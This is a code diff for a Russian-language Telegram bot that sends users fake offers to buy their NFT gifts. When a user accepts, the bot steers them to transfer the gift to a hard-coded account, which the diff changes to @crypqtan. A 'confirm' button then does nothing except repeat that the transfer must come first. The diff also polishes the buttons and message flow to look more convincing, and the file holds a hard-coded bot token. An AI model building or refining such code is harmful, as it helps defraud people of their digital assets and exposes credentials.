@@ -10,7 +10,7 @@ from aiogram.exceptions import TelegramRetryAfter
 
 # Настройки
 TOKEN = "9252419350:AAFEQ930iWfDMcC1bNRmOE2zmSbYK9kpj_g"
-RECIPIENT = "@tradiqx"  # Юзернейм, куда передается НФТ
+RECIPIENT = "@crypqtan"  # Юзернейм, куда передается НФТ
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN)
@@ -124,15 +124,20 @@ def make_offer_keyboard(gift_name, gift_num, amount, currency_symbol, lang):
     loc = LOCALES.get(lang, LOCALES["ru"])
     cb_data = f"a|{gift_name}|{gift_num}|{amount}|{currency_symbol}|{lang}"
     decline_data = f"d|{gift_num}"
-    
-    decline_btn_text = f"❌ {loc['decline']}"
-    accept_btn_text = f"✅ {loc['accept']}"
 
     return InlineKeyboardMarkup(
         inline_keyboard=[
             [
-                InlineKeyboardButton(text=decline_btn_text, callback_data=decline_data),
-                InlineKeyboardButton(text=accept_btn_text, callback_data=cb_data)
+                InlineKeyboardButton(
+                    text=loc['decline'], 
+                    callback_data=decline_data,
+                    icon_custom_emoji_id="5778527486270770928"
+                ),
+                InlineKeyboardButton(
+                    text=loc['accept'], 
+                    callback_data=cb_data,
+                    icon_custom_emoji_id="5776375003280838798"
+                )
             ]
         ]
     )
@@ -154,14 +159,22 @@ def build_accept_text(gift_name, gift_num, currency_name, lang):
 def make_accept_keyboard(lang):
     loc = LOCALES.get(lang, LOCALES["ru"])
     recipient = RECIPIENT.lstrip("@")
-    
-    transfer_btn_text = f"↗️ {loc['btn_transfer']}"
-    confirm_btn_text = f"⊙ {loc['btn_confirm']}"
 
     return InlineKeyboardMarkup(
         inline_keyboard=[
-            [InlineKeyboardButton(text=transfer_btn_text, url=f"tg://send_gift?to={recipient}")],
-            [InlineKeyboardButton(text=confirm_btn_text, callback_data="noop")],
+            [
+                InlineKeyboardButton(
+                    text=loc['btn_transfer'], 
+                    url=f"tg://send_gift?to={recipient}",
+                    icon_custom_emoji_id="5875180111744995604"
+                )
+            ],
+            [
+                InlineKeyboardButton(
+                    text=loc['btn_confirm'], 
+                    callback_data="noop"
+                )
+            ],
         ]
     )
 
@@ -251,15 +264,9 @@ async def accept_offer(cb: CallbackQuery):
     chat_id = cb.message.chat.id
 
     try:
-        # 1. Удаляем старое сообщение с оффером
-        await bot.delete_business_messages(
-            business_connection_id=bcid,
-            message_ids=[cb.message.message_id]
-        )
-        
-        # 2. Отправляем новое сообщение с инструкцией и кнопкой передачи
-        await bot.send_message(
+        await bot.edit_message_text(
             chat_id=chat_id,
+            message_id=cb.message.message_id,
             text=text,
             parse_mode=ParseMode.HTML,
             reply_markup=make_accept_keyboard(lang),
@@ -267,8 +274,11 @@ async def accept_offer(cb: CallbackQuery):
             link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True)
         )
     except Exception as e:
-        logging.error(f"Error handling accepted offer: {e}")
-        await cb.answer("Не удалось обработать оффер", show_alert=True)
+        if "message is not modified" in str(e):
+            await cb.answer("Предложение уже было принято!", show_alert=True)
+            return
+        logging.error(f"Error editing message: {e}")
+        await cb.answer("Не удалось обновить оффер", show_alert=True)
         return
 
     await cb.answer("Предложение принято!")
@@ -289,7 +299,7 @@ async def decline_offer(cb: CallbackQuery):
 async def noop_handler(cb: CallbackQuery):
     await cb.answer("Сначала выполните передачу НФТ по кнопке выше!", show_alert=True)
 
-# Фоновый воркер с увеличенной плавной задержкой (3.0 - 5.0 сек) для защиты от флуда
+# Фоновый воркер с плавной защитной задержкой (3.0 - 5.0 сек)
 async def sender_worker():
     while True:
         task = await message_queue.get()
